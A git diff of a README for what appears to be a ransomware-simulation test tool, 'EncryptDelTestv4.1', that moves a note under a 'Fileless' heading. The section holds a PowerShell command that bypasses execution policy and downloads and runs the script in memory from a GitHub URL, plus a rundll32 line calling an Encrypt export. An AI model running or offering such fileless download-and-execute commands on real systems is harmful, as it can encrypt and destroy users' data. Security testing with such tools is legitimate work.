@@ -50,11 +50,12 @@ EncryptDelTestv4.1.exe
 EncryptDelTestv4.1.ps1
 - runs on Windows
 - requires PowerShell
-- (download and run in memory directly) 
 
 
 Fileless
+- (download and run in memory directly) 
 - powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/EncryptDelTestv4.1.ps1.txt')"
+
 
 EncryptDelTestv4.1.dll
 - rundll32.exe EncryptDelTestv4.1.dll,Encrypt
